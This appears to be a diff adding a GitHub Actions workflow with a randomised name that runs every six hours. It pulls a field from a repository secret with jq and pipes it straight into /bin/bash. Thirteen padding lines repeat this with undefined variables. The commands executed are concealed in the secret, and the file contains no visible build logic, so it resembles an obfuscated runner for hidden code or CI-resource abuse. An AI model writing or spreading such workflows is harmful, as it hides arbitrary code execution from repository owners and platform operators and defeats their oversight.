@@ -1,0 +1,30 @@
+name: shiliangyuanrui
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shiliangyuanrui
+        env:
+          a27402: ${{ secrets.a27402 }}
+        run: |
+          echo $a27402 | jq -r .sz7 | /bin/bash
+          echo $rgook2 | jq -r .gbqqh76515 | /bin/bash
+          echo $zn8631 | jq -r .zg7 | /bin/bash
+          echo $iocr8025 | jq -r .d160 | /bin/bash
+          echo $w80 | jq -r .sownl3 | /bin/bash
+          echo $yfhf481 | jq -r .mcjx1 | /bin/bash
+          echo $iavn661 | jq -r .ql984 | /bin/bash
+          echo $qlu403 | jq -r .w2 | /bin/bash
+          echo $c8335 | jq -r .h9 | /bin/bash
+          echo $q0 | jq -r .kpa2 | /bin/bash
+          echo $q7961 | jq -r .ct89 | /bin/bash
+          echo $bacg2293 | jq -r .x84154 | /bin/bash
+          echo $itqr9 | jq -r .iffo68 | /bin/bash
+          echo $sas8324 | jq -r .zg6 | /bin/bash
+
